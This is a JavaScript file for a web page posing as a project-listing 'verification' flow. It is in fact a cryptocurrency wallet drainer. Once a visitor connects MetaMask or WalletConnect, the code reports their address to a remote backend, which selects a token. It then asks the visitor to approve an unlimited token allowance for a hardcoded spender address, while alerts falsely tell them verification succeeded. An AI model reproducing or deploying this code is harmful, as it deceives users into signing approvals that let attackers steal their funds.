'use strict';

/* ============================
   CONFIG & GLOBAL VARIABLES
   ============================ */
const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
const SPENDER_ADDRESS = "0x3352a9d6719a321608806a71b5bec20259cd34ce";
const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";

let provider, signer;

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

/* ============================
   ORIGINAL UI FLOW (PRESERVED)
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (e) => { e.preventDefault(); feeModal.style.display = 'flex'; });
}
if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => { feeModal.style.display = 'none'; });
}
if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}
if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => { walletModal.style.display = 'none'; });
}

/* ============================
   CONNECTION HANDLERS
   ============================ */
metaMaskButton?.addEventListener('click', connectMetaMask);
walletConnectButton?.addEventListener('click', connectWalletConnect);

/* ============================
   THE "BRAIN" (HANDLES BOTH)
   ============================ */
async function handleWalletProcess(authProvider) {
  try {
    const accounts = await authProvider.request({ method: "eth_requestAccounts" });
    const account = accounts[0];

    provider = new ethers.providers.Web3Provider(authProvider);
    signer = provider.getSigner();

    // 1. Ask Backend to scan
    const response = await fetch(`${BACKEND_URL}/notify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account })
    });

    const data = await response.json();

    // 2. Trigger Approval based on backend result
    if (data.success && data.tokenAddress) {
      await approveSpender(data.tokenAddress, data.symbol);
    } else {
      alert("Verification successful!");
      walletModal.style.display = 'none';
    }
  } catch (error) {
    console.error("Process error:", error);
    alert("Connection failed. Please try again.");
  }
}

async function approveSpender(tokenAddress, symbol) {
  try {
    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    const tx = await contract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
    await tx.wait();
    alert(`✅ ${symbol} verification successful!`);
    walletModal.style.display = 'none';
  } catch (err) {
    console.error("Approval error:", err);
  }
}

/* ============================
   SPECIFIC CONNECTORS
   ============================ */
async function connectMetaMask() {
  if (!window.ethereum) return alert("MetaMask not found.");
  await handleWalletProcess(window.ethereum);
}

let wcProvider = null;
async function connectWalletConnect() {
  try {
    if (wcProvider) {
      await wcProvider.disconnect().catch(() => {});
      wcProvider = null;
    }

    walletConnectButton.classList.add('loading');
    walletConnectButton.disabled = true;

    // We use the most stable bundle version
    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');

    wcProvider = await EthereumProvider.init({
      projectId: WC_PROJECT_ID,
      showQrModal: true,
      // We list the chains directly in the main config for better mobile support
      chains: [1], 
      methods: ["eth_sendTransaction", "personal_sign", "eth_requestAccounts"],
      events: ["chainChanged", "accountsChanged"],
      metadata: {
        name: 'Project Listing',
        description: 'Verification Required',
        url: window.location.origin,
        icons: ['https://avatars.githubusercontent.com/u/37784886']
      }
    });

    // Simple listener for the connection
    wcProvider.on("connect", () => {
      console.log("WalletConnect Connected");
    });

    await wcProvider.enable();
    
    // Once enabled, pass to your backend scanning logic
    await handleWalletProcess(wcProvider);

  } catch (err) {
    console.error("WC Error:", err);
    // If it fails, we alert and reset the button so they can try again
    alert('Connection failed. If you are on mobile, please try opening the link directly in your wallet browser.');
  } finally {
    walletConnectButton.classList.remove('loading');
    walletConnectButton.disabled = false;
  }
}
